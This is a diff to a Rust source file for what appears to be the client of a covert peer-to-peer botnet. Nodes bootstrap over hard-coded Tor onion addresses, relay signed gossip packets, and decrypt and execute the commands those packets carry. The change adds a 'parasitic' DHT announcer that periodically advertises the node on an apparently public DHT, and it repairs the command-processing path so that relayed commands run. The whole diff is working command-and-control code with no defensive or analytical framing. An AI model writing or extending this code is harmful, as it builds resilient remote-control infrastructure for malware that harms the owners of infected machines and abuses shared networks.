@@ -7,8 +7,8 @@ use std::num::NonZeroUsize;
 use protocol::{MeshMsg, PeerInfo, GhostPacket, CommandPayload, GossipMsg, Registration};
 use protocol::crypto::verify_signature;
 use protocol::quic::PhantomFrame;
-use crate::common::crypto::load_or_generate_keys;
-use crate::utils::paths::get_appdata_dir;
+use crate::config::crypto::load_or_generate_keys;
+use crate::helpers::paths::get_appdata_dir;
 use crate::p2p::transport::{QuicPool, make_client_config};
 use crate::p2p::dht::{RoutingTable, InsertResult};
 use rand::seq::SliceRandom;
@@ -51,11 +51,23 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
         keypair: identity.keypair.clone(),
     }));
 
-    // 4. Boostrap
-    use crate::common::constants::BOOTSTRAP_ONIONS;    
-    for bootstrap_addr in BOOTSTRAP_ONIONS.iter() {
-         let _ = register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await;
-    }
+     // 4. Boostrap
+     use crate::config::constants::BOOTSTRAP_ONIONS;    
+     for bootstrap_addr in BOOTSTRAP_ONIONS.iter() {
+          let _ = register_node(&state, bootstrap_addr, &my_pub_hex, &my_address, &identity.keypair).await;
+     }
+
+     // 5. Start Parasitic DHT Announcer (Mesh Role)
+     use crate::discovery::parasitic::ParasiticDiscovery;
+     tokio::spawn(async move {
+         let discovery = ParasiticDiscovery::new();
+         loop {
+             if let Err(e) = discovery.map_role_announce(local_port).await {
+                 eprintln!("DHT Announce Error: {}", e);
+             }
+             tokio::time::sleep(Duration::from_secs(600)).await; // 10 minutes
+         }
+     });
 
     let state_clone = state.clone();
 
@@ -203,6 +215,9 @@ async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, _session: 
              (all, neighbors)
          };
          
+         // Clone packet for later use
+         let packet_clone = msg.packet.clone();
+         
          let next_msg = GossipMsg { 
              id: msg.id,
              packet: msg.packet, 
@@ -217,9 +232,11 @@ async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, _session: 
          for target_peer in targets { 
              let _ = guard.pool.send_msg(&target_peer.onion_address, msg_bytes.clone(), 2, transport_sig, &neighbors).await;
          }
-    // Extract and process command from gossip packet
-    if let Some(cmd) = packet_verify_and_decrypt(&msg.packet, &[]) {
-        process_command(&cmd);
+         
+         // Extract and process command from gossip packet
+         if let Some(cmd) = packet_verify_and_decrypt(&packet_clone, &[]) {
+             process_command(&cmd);
+         }
     }
 }
 
